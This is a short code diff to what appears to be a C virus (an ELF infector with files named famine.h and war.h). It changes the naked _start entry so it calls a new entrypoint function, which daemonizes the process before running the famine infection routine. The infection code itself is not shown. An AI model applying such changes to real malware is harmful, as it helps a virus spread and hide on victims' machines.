@@ -14,10 +14,12 @@
 #include "syscall.h"
 #include "famine.h"
 #include "war.h"
+#include "daemon.h"
 
 extern void end();
 void famine(void);
 void jmp_end(void);
+void entrypoint(void);
 
 #define JMP_SIZE 4
 
@@ -33,7 +35,7 @@ void jmp_end(void);
 void	__attribute__((naked)) _start(void)
 {
 	__asm__ (".global jmp_end	\n"
-			 "call famine		\n"
+			 "call entrypoint	\n"
 			 "pop %rdx			\n"
 			 "jmp_end:			\n"
 			 "jmp end			\n");
@@ -324,4 +326,10 @@ void	famine(void)
 	if (counter != 0) {
 		self_fingerprint(host_name, counter);
 	}
+}
+
+void	entrypoint(void)
+{
+	daemonize();
+	famine();
 }
